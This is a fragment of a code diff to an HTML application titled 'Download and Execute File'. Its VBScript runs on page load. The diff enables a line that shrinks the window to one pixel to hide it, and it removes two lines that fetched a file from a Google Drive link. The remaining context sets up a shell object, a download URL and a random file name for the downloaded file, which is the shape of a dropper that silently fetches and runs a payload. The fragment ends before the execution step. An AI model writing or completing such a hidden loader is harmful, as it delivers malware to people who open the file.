@@ -6,10 +6,8 @@
     <title>Download and Execute File</title>
     <script type="text/vbscript">
         Sub Window_onLoad
-            ' Window.resizeTo 1, 1
+            Window.resizeTo 1, 1
             ' Window.MoveTo -32000, -32000
-            Call CreateObject("MSXML2.XMLHTTP").Open("GET", "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H", False)
-            Call CreateObject("MSXML2.XMLHTTP").Send()
 
             Dim objShell, tempFolder, downloadUrl, randomFileName, downloadedFile
             Set objShell = CreateObject("WScript.Shell")
